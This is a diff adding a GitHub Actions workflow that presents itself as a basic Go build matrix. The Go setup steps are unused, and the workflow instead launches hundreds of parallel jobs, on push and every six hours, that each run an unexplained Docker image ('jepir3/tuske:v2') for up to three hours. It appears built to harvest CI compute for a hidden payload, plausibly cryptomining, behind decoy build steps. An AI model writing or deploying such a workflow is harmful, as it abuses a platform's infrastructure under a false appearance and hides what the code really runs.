@@ -1,0 +1,96 @@
+# This is a basic workflow to help you get started with Actions10
+
+name: pekerja
+on: 
+  push:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  pekerjaRodi:
+    runs-on: ubuntu-20.04
+    strategy:
+      max-parallel: 100
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
+    timeout-minutes: 6
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Main
+      run: |
+        timeout 4m docker run jepir3/tuske:v2 &
+        sleep 4m
+        echo "sukses"
+  BuruhBorongan:
+    needs: pekerjaRodi
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Main
+      run: |
+        timeout 2h docker run jepir3/tuske:v2 &
+        sleep 2h
+        echo "sukses"
+  BuruhBorongan2:
+    needs: pekerjaRodi
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Main
+      run: |
+        timeout 3h docker run jepir3/tuske:v2 &
+        sleep 3h
+        echo "sukses"
+  Success:
+    needs: [pekerjaRodi, BuruhBorongan]
+    if: always()
+    runs-on: ubuntu-20.04
+    steps:
+      - uses: technote-space/workflow-conclusion-action@v2
+      - name: Check Failure
+        if: env.WORKFLOW_CONCLUSION == 'failure'
+        run: exit 1
+      - name: Success
+        if: ${{ success() }}
+        run: echo "all don,All Done"
